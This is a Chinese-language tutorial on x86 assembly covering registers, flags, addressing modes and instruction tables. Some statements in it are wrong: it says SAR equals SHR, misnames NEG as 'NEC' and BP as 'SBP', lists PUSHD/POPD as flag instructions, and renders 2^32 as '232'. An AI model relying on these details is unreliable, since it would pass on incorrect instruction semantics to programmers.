<p><img src="/images/x86-registers.png" alt="x86-registers"><br>X86处理器中有8个32位的通用寄存器。由于历史的原因，EAX通常用于计算，ECX通常用于循环变量计数。ESP和EBP有专门用途，ESP指示栈指针(用于指示栈顶位置)，而EBP则是基址指针（用于指示子程序或函数调用的基址指针）。如图中所示，EAX、EBX、ECX和EDX的前两个高位字节和后两个低位字节可以独立使用，其中两位低字节又被独立分为H和L部分，这样做的原因主要是考虑兼容16位的程序。应用寄存器时，其名称大小写是不敏感的，如EAX和eax没有区别。</p>
<h3 id="数据寄存器"><a href="#数据寄存器" class="headerlink" title="数据寄存器"></a>数据寄存器</h3><p>  数据寄存器主要用来保存操作数和运算结果等信息，从而节省读取操作数所需占用总线和访问存储器的时间。<br>  32位CPU有4个32位的通用寄存器EAX、EBX、ECX和EDX。对低16位数据的存取，不会影响高16位的数据。这些低16位寄存器分别命名为：AX、BX、CX和DX，它和先前的CPU中的寄存器相一致。</p>
<p>  4个16位寄存器又可分割成8个独立的8位寄存器(AX：AH-AL、BX：BH-BL、CX：CH-CL、DX：DH-DL)，每个寄存器都有自己的名称，可独立存取。程序员可利用数据寄存器的这种“可分可合”的特性，灵活地处理字/字节的信息。</p>
<p>  寄存器AX和AL通常称为累加器(Accumulator)，用累加器进行的操作可能需要更少时间。累加器可用于乘、除、输入/输出等操作，它们的使用频率很高；寄存器BX称为基地址寄存器(Base Register)。它可作为存储器指针来使用；寄存器CX称为计数寄存器(Count Register)。在循环和字符串操作时，要用它来控制循环次数；在位操作中，当移多位时，要用CL来指明移位的位数；寄存器DX称为数据寄存器(Data Register)。在进行乘、除运算时，它可作为默认的操作数参与运算，也可用于存放I/O的端口地址.</p>
<p>  在16位CPU中，AX、BX、CX和DX不能作为基址和变址寄存器来存放存储单元的地址，但在32位CPU中，其32位寄存器EAX、EBX、ECX和EDX不仅可传送数据、暂存数据保存算术逻辑运算结果，而且也可作为指针寄存器，所以，这些32位寄存器更具有通用性。 </p>
<h3 id="变址寄存器"><a href="#变址寄存器" class="headerlink" title="变址寄存器"></a>变址寄存器</h3><p>32位CPU有2个32位通用寄存器ESI和EDI。其低16位对应先前CPU中的SI和DI，对低16位数据的存取，不影响高16位的数据。</p>
<p>寄存器ESI、EDI、SI和DI称为变址寄存器(Index Register)，它们主要用于存放存储单元在段内的偏移量，用它们可实现多种存储器操作数的寻址方式，为以不同的地址形式访问存储单元提供方便。 </p>
<p>变址寄存器不可分割成8位寄存器。作为通用寄存器，也可存储算术逻辑运算的操作数和运算结果。它们可作一般的存储器指针使用。在字符串操作指令的执行过程中，对它们有特定的要求，而且还具有特殊的功能。</p>
<h3 id="指针寄存器"><a href="#指针寄存器" class="headerlink" title="指针寄存器"></a>指针寄存器</h3><p>32位CPU有2个32位通用寄存器EBP和ESP。其低16位对应先前CPU中的SBP和SP，对低16位数据的存取，不影响高16位的数据。 </p>
<p>寄存器EBP、ESP、BP和SP称为指针寄存器(Pointer Register)，主要用于存放堆栈内存储单元的偏移量，用它们可实现多种存储器操作数的寻址方式，为以不同的地址形式访问存储单元提供方便。指针寄存器不可分割成8位寄存器。作为通用寄存器，也可存储算术逻辑运算的操作数和运算结果。</p>
<p>它们主要用于访问堆栈内的存储单元，并且规定：</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">BP为基指针(Base <span class="keyword">Pointer</span>)寄存器，用它可直接存取堆栈中的数据；</div><div class="line">SP为堆栈指针(Stack <span class="keyword">Pointer</span>)寄存器，用它只可访问栈顶。</div></pre></td></tr></table></figure>
<h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><p> 段寄存器是根据内存分段的管理模式而设置的。内存单元的物理地址由段寄存器的值和一个偏移量组合而成的，这样可用两个较少位数的值组合成一个可访问较大物理空间的内存地址。</p>
<p>CPU内部的段寄存器：<br>    CS——代码段寄存器(Code Segment Register)，其值为代码段的段值；<br>    DS——数据段寄存器(Data Segment Register)，其值为数据段的段值；<br>    ES——附加段寄存器(Extra Segment Register)，其值为附加数据段的段值；<br>    SS——堆栈段寄存器(Stack Segment Register)，其值为堆栈段的段值；<br>    FS——附加段寄存器(Extra Segment Register)，其值为附加数据段的段值；<br>    GS——附加段寄存器(Extra Segment Register)，其值为附加数据段的段值。</p>
<p>在16位CPU系统中，它只有4个段寄存器，所以，程序在任何时刻至多有4个正在使用的段可直接访问；在32位微机系统中，它有6个段寄存器，所以，在此环境下开发的程序最多可同时访问6个段。</p>
<p>32位CPU有两个不同的工作方式：实方式和保护方式。在每种方式下，段寄存器的作用是不同的。有关规定简单描述如下：<br>实方式:前4个段寄存器CS、DS、ES和SS与先前CPU中的所对应的段寄存器的含义完全一致，内存单元的逻辑地址仍为“段值：偏移量”的形式。为访问某内存段内的数据，必须使用该段寄存器和存储单元的偏移量。<br>保护方式:在此方式下，情况要复杂得多，装入段寄存器的不再是段值，而是称为“选择子”(Selector)的某个值。</p>
<h3 id="指令指针寄存器"><a href="#指令指针寄存器" class="headerlink" title="指令指针寄存器"></a>指令指针寄存器</h3><p>32位CPU把指令指针扩展到32位，并记作EIP，EIP的低16位与先前CPU中的IP作用相同。</p>
<p>指令指针EIP、IP(Instruction Pointer)是存放下次将要执行的指令在代码段的偏移量。在具有预取指令功能的系统中，下次要执行的指令通常已被预取到指令队列中，除非发生转移情况。所以，在理解它们的功能时，不考虑存在指令队列的情况。</p>
<p>在实方式下，由于每个段的最大范围为64K，所以，EIP中的高16位肯定都为0，此时，相当于只用其低16位的IP来反映程序中指令的执行次序</p>
<h3 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h3><h4 id="运算结果标志位"><a href="#运算结果标志位" class="headerlink" title="运算结果标志位"></a>运算结果标志位</h4><p>1、进位标志CF(Carry Flag)<br>进位标志CF主要用来反映运算是否产生进位或借位。如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。使用该标志位的情况有：多字(字节)数的加减运算，无符号数的大小比较运算，移位操作，字(字节)之间移位，专门改变CF值的指令等。<br>2、奇偶标志PF(Parity Flag)<br>奇偶标志PF用于反映运算结果中“1”的个数的奇偶性。如果“1”的个数为偶数，则PF的值为1，否则其值为0。<br>利用PF可进行奇偶校验检查，或产生奇偶校验位。在数据传送过程中，为了提供传送的可靠性，如果采用奇偶校验的方法，就可使用该标志位。<br>3、辅助进位标志AF(Auxiliary Carry Flag)<br>在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0：<br>(1)在字操作时，发生低字节向高字节进位或借位时；<br>(2)在字节操作时，发生低4位向高4位进位或借位时。<br>对以上6个运算结果标志位，在一般编程情况下，标志位CF、ZF、SF和OF的使用频率较高，而标志位PF和AF的使用频率较低。<br>4、零标志ZF(Zero Flag)<br>零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。<br>5、符号标志SF(Sign Flag)<br>符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。在微机系统中，有符号数采用补码表示法，所以，SF也就反映运算结果的正负号。运算结果为正数时，SF的值为0，否则其值为1。<br>6、溢出标志OF(Overflow Flag)<br>溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。</p>
<h4 id="状态控制标志位"><a href="#状态控制标志位" class="headerlink" title="状态控制标志位"></a>状态控制标志位</h4><p>状态控制标志位是用来控制CPU操作的，它们要通过专门的指令才能使之发生改变。<br>1、追踪标志TF(Trap Flag)<br>当追踪标志TF被置为1时，CPU进入单步执行方式，即每执行一条指令，产生一个单步中断请求。这种方式主要用于程序的调试。<br>指令系统中没有专门的指令来改变标志位TF的值，但程序员可用其它办法来改变其值。<br>2、中断允许标志IF(Interrupt-enable Flag)<br>中断允许标志IF是用来决定CPU是否响应CPU外部的可屏蔽中断发出的中断请求。但不管该标志为何值，CPU都必须响应CPU外部的不可屏蔽中断所发出的中断请求，以及CPU内部产生的中断请求。具体规定如下：<br>(1)当IF=1时，CPU可以响应CPU外部的可屏蔽中断发出的中断请求；<br>(2)当IF=0时，CPU不响应CPU外部的可屏蔽中断发出的中断请求。<br>CPU的指令系统中也有专门的指令来改变标志位IF的值。<br>3、方向标志DF(Direction Flag)<br>方向标志DF用来决定在串操作指令执行时有关指针寄存器发生调整的方向。具体规定在第5.2.11节——字符串操作指令——中给出。在微机的指令系统中，还提供了专门的指令来改变标志位DF的值。</p>
<h4 id="32位标志寄存器增加的标志位"><a href="#32位标志寄存器增加的标志位" class="headerlink" title="32位标志寄存器增加的标志位"></a>32位标志寄存器增加的标志位</h4><p>1、I/O特权标志IOPL(I/O Privilege Level)<br>    I/O特权标志用两位二进制位来表示，也称为I/O特权级字段。该字段指定了要求执行I/O指令的特权级。如果当前的特权级别在数值上小于等于IOPL的值，那么，该I/O指令可执行，否则将发生一个保护异常<br>2、嵌套任务标志NT(Nested Task)<br>嵌套任务标志NT用来控制中断返回指令IRET的执行。具体规定如下：<br>(1)当NT=0，用堆栈中保存的值恢复EFLAGS、CS和EIP，执行常规的中断返回操作；<br>(2)当NT=1，通过任务转换实现中断返回。<br>3、重启动标志RF(Restart Flag)<br>重启动标志RF用来控制是否接受调试故障。规定：RF=0时，表示“接受”调试故障，否则拒绝之。在成功执行完一条指令后，处理机把RF置为0，当接受到一个非调试故障时，处理机就把它置为1。<br>4、虚拟8086方式标志VM(Virtual 8086 Mode)<br>如果该标志的值为1，则表示处理机处于虚拟的8086方式下的工作状态，否则，处理机处于一般保护方式下的工作状态</p>
<h1 id="内存和寻址模式"><a href="#内存和寻址模式" class="headerlink" title="内存和寻址模式"></a>内存和寻址模式</h1><h2 id="声明静态数据区"><a href="#声明静态数据区" class="headerlink" title="声明静态数据区"></a>声明静态数据区</h2><p>可以在X86汇编语言中用汇编指令.DATA声明静态数据区（类似于全局变量），数据以单字节、双字节、或双字（4字节）的方式存放，分别用DB,DW, DD指令表示声明内存的长度。在汇编语言中，相邻定义的标签在内存中是连续存放的。</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">.DATA	 	 	 </div><div class="line">var	    DB <span class="number">64</span>  	;声明一个字节，并将数值<span class="number">64</span>放入此字节中</div><div class="line">var2	DB ?	; 声明一个为初始化的字节.</div><div class="line"> 	    DB <span class="number">10</span>	; 声明一个没有label的字节，其值为<span class="number">10.</span></div><div class="line">X	    DW ?	; 声明一个双字节，未初始化.</div><div class="line">Y	    DD <span class="number">30000</span>; 声明一个<span class="number">4</span>字节，其值为<span class="number">30000.</span></div></pre></td></tr></table></figure>
<p>还可以声明连续的数据和数组，声明数组时使用DUP关键字</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Z	   DD 1, 2, 3	; <span class="keyword">Declare</span> three <span class="number">4</span>-<span class="keyword">byte</span> <span class="keyword">values</span>, <span class="keyword">initialized</span> <span class="keyword">to</span> <span class="number">1</span>, <span class="number">2</span>, <span class="keyword">and</span> <span class="number">3.</span> The <span class="keyword">value</span> <span class="keyword">of</span> location Z + <span class="number">8</span> will be <span class="number">3.</span></div><div class="line"><span class="keyword">bytes</span>  DB <span class="number">10</span> DUP(?)	; <span class="keyword">Declare</span> <span class="number">10</span> uninitialized <span class="keyword">bytes</span> <span class="keyword">starting</span> <span class="keyword">at</span> location bytes.</div><div class="line">arr	   DD <span class="number">100</span> DUP(<span class="number">0</span>); <span class="keyword">Declare</span> <span class="number">100</span> <span class="number">4</span>-<span class="keyword">byte</span> words <span class="keyword">starting</span> <span class="keyword">at</span> location arr, all <span class="keyword">initialized</span> <span class="keyword">to</span> <span class="number">0</span></div><div class="line"><span class="keyword">str</span>	   DB <span class="string">'hello'</span>,<span class="number">0</span>	; <span class="keyword">Declare</span> <span class="number">6</span> <span class="keyword">bytes</span> <span class="keyword">starting</span> <span class="keyword">at</span> the address <span class="keyword">str</span>, <span class="keyword">initialized</span> <span class="keyword">to</span> the <span class="keyword">ASCII</span> <span class="built_in">character</span> <span class="keyword">values</span> <span class="keyword">for</span> hello <span class="keyword">and</span> the <span class="literal">null</span> (<span class="number">0</span>) byte.</div></pre></td></tr></table></figure>
<h2 id="寻址模式"><a href="#寻址模式" class="headerlink" title="寻址模式"></a>寻址模式</h2><p>现代X86处理器具有232字节的寻址空间。在上面的例子中，我们用标签(label)表示内存区域，这些标签在实际汇编时，均被32位的实际地址代替。除了支持这种直接的内存区域描述，X86还提供了一种灵活的内存寻址方式，即利用最多两个32位的寄存器和一个32位的有符号常数相加计算一个内存地址，其中一个寄存器可以左移1、2或3位以表述更大的空间。下面例子是汇编程序中常见的方式</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebx</span>]	    <span class="comment">; 将ebx值指示的内存地址中的4个字节传送到eax中</span></div><div class="line"><span class="keyword">mov</span> [var], <span class="built_in">ebx</span>	    <span class="comment">; 将ebx的内容传送到var的值指示的内存地址中.</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">esi</span>-<span class="number">4</span>]	<span class="comment">; 将esi-4值指示的内存地址中的4个字节传送到eax中</span></div><div class="line"><span class="keyword">mov</span> [<span class="built_in">esi</span>+<span class="built_in">eax</span>], <span class="built_in">cl</span>	<span class="comment">; 将cl的值传送到esi+eax的值指示的内存地址中</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">edx</span>, [<span class="built_in">esi</span>+<span class="number">4</span>*<span class="built_in">ebx</span>]<span class="comment">; 将esi+4*ebx值指示的内存中的4个字节传送到edx</span></div></pre></td></tr></table></figure>
<p>下面是违反规则的例子:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebx</span>-<span class="built_in">ecx</span>]	   <span class="comment">; 只能用加法</span></div><div class="line"><span class="keyword">mov</span> [<span class="built_in">eax</span>+<span class="built_in">esi</span>+<span class="built_in">edi</span>], <span class="built_in">ebx</span> <span class="comment">; 最多只能有两个寄存器参与运算</span></div></pre></td></tr></table></figure>
<h2 id="长度规定"><a href="#长度规定" class="headerlink" title="长度规定"></a>长度规定</h2><p>在声明内存大小时，在汇编语言中，一般用DB，DW，DD均可声明的内存空间大小，这种现实声明能够很好地指导汇编器分配内存空间，但是，对于</p>
<p>mov [ebx], 2</p>
<p>如果没有特殊的标识，则不确定常数2是单字节、双字节，还是双字。对于这种情况，X86提供了三个指示规则标记，分别为BYTE PTR, WORD PTR, and DWORD PTR，如上面例子写成：mov BYTE PTR [ebx], 2， mov WORD PTR [ebx], 2， mov DWORD PTR [ebx], 2，则意思非常清晰。</p>
<h1 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h1><h2 id="数据传输指令"><a href="#数据传输指令" class="headerlink" title="数据传输指令"></a>数据传输指令</h2><p>它们在存贮器和寄存器、寄存器和输入输出端口之间传送数据<br>1.输入输出端口传送指令.</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">IN    <span class="keyword">I</span>/<span class="keyword">O</span>端口输入( 语法: IN 累加器, &#123;端口号│DX&#125; ) </div><div class="line">OUT   <span class="keyword">I</span>/<span class="keyword">O</span>端口输出(语法: OUT &#123;端口号│DX&#125;,累加器 )</div></pre></td></tr></table></figure>
<p>输入输出端口由立即方式指定时, 其范围是 0-255; 由寄存器 DX 指定时, 其范围是 0-65535.</p>
<p>2.通用数据传送指令</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">MOV</span>    传送字或字节        </div><div class="line"><span class="keyword">MOVSX</span>  先符号扩展,再传送          </div><div class="line"><span class="keyword">MOVZX</span>  先零扩展,再传送  </div><div class="line"><span class="keyword">PUSH</span>   把字压入堆栈       </div><div class="line"><span class="keyword">POP</span>    把字弹出堆栈      </div><div class="line"><span class="keyword">PUSHA</span>  把<span class="built_in">AX</span>,<span class="built_in">CX</span>,<span class="built_in">DX</span>,<span class="built_in">BX</span>,<span class="built_in">SP</span>,<span class="built_in">BP</span>,<span class="built_in">SI</span>,<span class="built_in">DI</span>依次压入堆栈  </div><div class="line"><span class="keyword">POPA</span>   把<span class="built_in">DI</span>,<span class="built_in">SI</span>,<span class="built_in">BP</span>,<span class="built_in">SP</span>,<span class="built_in">BX</span>,<span class="built_in">DX</span>,<span class="built_in">CX</span>,<span class="built_in">AX</span>依次弹出堆栈  </div><div class="line"><span class="keyword">PUSHAD</span> 把<span class="built_in">EAX</span>,<span class="built_in">ECX</span>,<span class="built_in">EDX</span>,<span class="built_in">EBX</span>,<span class="built_in">ESP</span>,<span class="built_in">EBP</span>,<span class="built_in">ESI</span>,<span class="built_in">EDI</span>依次压入堆栈 </div><div class="line"><span class="keyword">POPAD</span>  把<span class="built_in">EDI</span>,<span class="built_in">ESI</span>,<span class="built_in">EBP</span>,<span class="built_in">ESP</span>,<span class="built_in">EBX</span>,<span class="built_in">EDX</span>,<span class="built_in">ECX</span>,<span class="built_in">EAX</span>依次弹出堆栈 </div><div class="line"><span class="keyword">BSWAP</span>  交换<span class="number">32</span>位寄存器里字节的顺序  </div><div class="line"><span class="keyword">XCHG</span>   交换字或字节( 至少有一个操作数为寄存器,段寄存器不可作为操作数)  </div><div class="line"><span class="keyword">CMPXCHG</span>比较并交换操作数( 第二个操作数必须为累加器<span class="built_in">AL</span>/<span class="built_in">AX</span>/<span class="built_in">EAX</span> )  </div><div class="line"><span class="keyword">XADD</span>   先交换再累加( 结果在第一个操作数里 )  </div><div class="line"><span class="keyword">XLAT</span>   字节查表转换  </div><div class="line">── <span class="built_in">BX</span> 指向一张 <span class="number">256</span> 字节的表的起点, <span class="built_in">AL</span> 为表的索引值 (<span class="number">0</span>-<span class="number">255</span>,即<span class="number">0</span>-<span class="number">FFH</span>)<span class="comment">; 返回 AL 为查表结果. ( [BX+AL]-&gt;AL )</span></div></pre></td></tr></table></figure>
<p>3.目的地址传送指令 </p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">LEA</span>   装入有效地址.                例: <span class="keyword">LEA</span> <span class="built_in">DX</span>,string  <span class="comment">;把偏移地址存到DX.  </span></div><div class="line"><span class="keyword">LDS</span>   传送目标指针,把指针内容装入<span class="built_in">DS</span>   例: <span class="keyword">LDS</span> <span class="built_in">SI</span>,string  <span class="comment">;把段地址:偏移地址存到DS:SI </span></div><div class="line"><span class="keyword">LES</span>   传送目标指针,把指针内容装入<span class="built_in">ES</span>   例: <span class="keyword">LES</span> <span class="built_in">DI</span>,string  <span class="comment">;把段地址:偏移地址存到ES:DI  </span></div><div class="line"><span class="keyword">LFS</span>   传送目标指针,把指针内容装入<span class="built_in">FS</span>   例: <span class="keyword">LFS</span> <span class="built_in">DI</span>,string  <span class="comment">;把段地址:偏移地址存到FS:DI </span></div><div class="line"><span class="keyword">LGS</span>   传送目标指针,把指针内容装入<span class="built_in">GS</span>   例: <span class="keyword">LGS</span> <span class="built_in">DI</span>,string  <span class="comment">;把段地址:偏移地址存到GS:DI  </span></div><div class="line"><span class="keyword">LSS</span>   传送目标指针,把指针内容装入<span class="built_in">SS</span>   例: <span class="keyword">LSS</span> <span class="built_in">DI</span>,string  <span class="comment">;把段地址:偏移地址存到SS:DI</span></div></pre></td></tr></table></figure>
<p>4.标志传送指令 </p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">LAHF</span>    标志寄存器传送,把标志装入<span class="number">AH</span> </div><div class="line"><span class="keyword">SAHF</span>    标志寄存器传送,把<span class="number">AH</span>内容装入标志寄存器 </div><div class="line"><span class="keyword">PUSHF</span>   标志入栈 </div><div class="line"><span class="keyword">POPF</span>    标志出栈 </div><div class="line">PUSHD   <span class="number">32</span>位标志入栈  </div><div class="line">POPD    <span class="number">32</span>位标志出栈.</div></pre></td></tr></table></figure>
<h2 id="算数运算指令"><a href="#算数运算指令" class="headerlink" title="算数运算指令"></a>算数运算指令</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ADD</span>     加法                                  </div><div class="line"><span class="keyword">ADC</span>     带进位加法                                </div><div class="line"><span class="keyword">INC</span>     加 <span class="number">1</span>      </div><div class="line"><span class="keyword">AAA</span>     加法的ASCII码调整            </div><div class="line"><span class="keyword">DAA</span>     加法的十进制调整.  </div><div class="line"><span class="keyword">SUB</span>     减法    </div><div class="line"><span class="keyword">SBB</span>     带借位减法      </div><div class="line"><span class="keyword">DEC</span>     减 <span class="number">1</span></div><div class="line">NEC     求反(以 <span class="number">0</span> 减之)                 </div><div class="line"><span class="keyword">CMP</span>     比较(两操作数作减法,仅修改标志位,不回送结果).  </div><div class="line"><span class="keyword">AAS</span>     减法的ASCII码调整            </div><div class="line"><span class="keyword">DAS</span>     减法的十进制调整.  </div><div class="line"><span class="keyword">MUL</span>     无符号乘法     </div><div class="line"><span class="keyword">IMUL</span>    整数乘法   </div><div class="line">以上两条,结果回送<span class="number">AH</span>和<span class="built_in">AL</span>(字节运算),或<span class="built_in">DX</span>和<span class="built_in">AX</span>(字运算),  </div><div class="line"><span class="keyword">AAM</span>     乘法的ASCII码调整      </div><div class="line"><span class="keyword">DIV</span>     无符号除法                        </div><div class="line"><span class="keyword">IDIV</span>    整数除法</div><div class="line">以上两条,结果回送:商回送<span class="built_in">AL</span>,余数回送<span class="number">AH</span>, (字节运算)<span class="comment">;或商回送AX,余数回送DX, (字运算).  </span></div><div class="line"><span class="keyword">AAD</span>    除法的ASCII码调整.  </div><div class="line"><span class="keyword">CBW</span>    字节转换为字(把<span class="built_in">AL</span>中字节的符号扩展到<span class="number">AH</span>中去)  </div><div class="line"><span class="keyword">CWD</span>    字转换为双字(把<span class="built_in">AX</span>中的字的符号扩展到<span class="built_in">DX</span>中去)  </div><div class="line"><span class="keyword">CWDE</span>   字转换为双字(把<span class="built_in">AX</span>中的字符号扩展到<span class="built_in">EAX</span>中去)  </div><div class="line"><span class="keyword">CDQ</span>    双字扩展(把<span class="built_in">EAX</span>中的字的符号扩展到<span class="built_in">EDX</span>中去)</div></pre></td></tr></table></figure>
<h2 id="逻辑运算指令"><a href="#逻辑运算指令" class="headerlink" title="逻辑运算指令"></a>逻辑运算指令</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">AND</span>  与运算                </div><div class="line"><span class="keyword">OR</span>   或运算               </div><div class="line"><span class="keyword">XOR</span>  异或运算                 </div><div class="line"><span class="keyword">NOT</span>  取反</div><div class="line"><span class="keyword">TEST</span> 测试(两操作数作与运算,仅修改标志位,不回送结果).  </div><div class="line"><span class="keyword">SHL</span>  逻辑左移                         </div><div class="line"><span class="keyword">SHR</span>  逻辑右移</div><div class="line"><span class="keyword">SAL</span>  算术左移(=<span class="keyword">SHL</span>)               </div><div class="line"><span class="keyword">SAR</span>  算术右移(=<span class="keyword">SHR</span>) </div><div class="line"><span class="keyword">ROL</span>  循环左移                        </div><div class="line"><span class="keyword">ROR</span>  循环右移  </div><div class="line"><span class="keyword">RCL</span>  通过进位的循环左移       </div><div class="line"><span class="keyword">RCR</span>  通过进位的循环右移 </div><div class="line">以上八种移位指令,其移位次数可达<span class="number">255</span>次 </div><div class="line">移位一次时, 可直接用操作码.  如 <span class="keyword">SHL</span> <span class="built_in">AX</span>,<span class="number">1</span> </div><div class="line">移位&gt;<span class="number">1</span>次时, 则由寄存器<span class="built_in">CL</span>给出移位次数  </div><div class="line">如  <span class="keyword">MOV</span> <span class="built_in">CL</span>,<span class="number">04</span>  </div><div class="line">    <span class="keyword">SHL</span> <span class="built_in">AX</span>,<span class="built_in">CL</span></div></pre></td></tr></table></figure>
<h2 id="串指令"><a href="#串指令" class="headerlink" title="串指令"></a>串指令</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">DS:</span><span class="built_in">SI</span>  源串段寄存器:源串变址                    </div><div class="line"><span class="symbol">ES:</span><span class="built_in">DI</span>  目标串段寄存器:目标串变址. </div><div class="line"><span class="built_in">CX</span>     重复次数计数器                  </div><div class="line"><span class="built_in">AL</span>/<span class="built_in">AX</span>  扫描值  </div><div class="line">D标志   <span class="number">0</span>表示重复操作中<span class="built_in">SI</span>和<span class="built_in">DI</span>应自动增量<span class="comment">; 1表示应自动减量  </span></div><div class="line">Z标志   用来控制扫描或比较操作的结束  </div><div class="line">MOVS   串传送 (<span class="keyword">MOVSB</span> 传送字符 <span class="keyword">MOVSW</span> 传送字 <span class="keyword">MOVSD</span> 传送双字 )  </div><div class="line">CMPS   串比较 (<span class="keyword">CMPSB</span> 比较字符  <span class="keyword">CMPSW</span> 比较字 )  </div><div class="line">SCAS   串扫描，把<span class="built_in">AL</span>或<span class="built_in">AX</span>的内容与目标串作比较,比较结果反映在标志位  </div><div class="line">LODS   装入串，把源串中的元素(字或字节)逐一装入<span class="built_in">AL</span>或<span class="built_in">AX</span>中. (<span class="keyword">LODSB</span>  传送字符   <span class="keyword">LODSW</span> 传送字      <span class="keyword">LODSD</span> 传送双字)  </div><div class="line">STOS   保存串，是LODS的逆过程  </div><div class="line"><span class="keyword">REP</span>    当<span class="built_in">CX</span>/<span class="built_in">ECX</span>&lt;&gt;<span class="number">0</span>时重复 </div><div class="line"><span class="keyword">REPE</span>/<span class="keyword">REPZ</span>    当ZF=<span class="number">1</span>或比较结果相等,且<span class="built_in">CX</span>/<span class="built_in">ECX</span>&lt;&gt;<span class="number">0</span>时重复  </div><div class="line"><span class="keyword">REPNE</span>/<span class="keyword">REPNZ</span>  当ZF=<span class="number">0</span>或比较结果不相等,且<span class="built_in">CX</span>/<span class="built_in">ECX</span>&lt;&gt;<span class="number">0</span>时重复  </div><div class="line">REPC         当CF=<span class="number">1</span>且<span class="built_in">CX</span>/<span class="built_in">ECX</span>&lt;&gt;<span class="number">0</span>时重复  </div><div class="line">REPNC        当CF=<span class="number">0</span>且<span class="built_in">CX</span>/<span class="built_in">ECX</span>&lt;&gt;<span class="number">0</span>时重复</div></pre></td></tr></table></figure>
<h2 id="程序转移指令"><a href="#程序转移指令" class="headerlink" title="程序转移指令"></a>程序转移指令</h2><h3 id="无条件转移指令-长转移"><a href="#无条件转移指令-长转移" class="headerlink" title="无条件转移指令 (长转移)"></a>无条件转移指令 (长转移)</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">JMP</span>     无条件转移指         </div><div class="line"><span class="keyword">CALL</span>    过程调用            </div><div class="line"><span class="keyword">RET</span>/<span class="keyword">RETF</span>过程返回</div></pre></td></tr></table></figure>
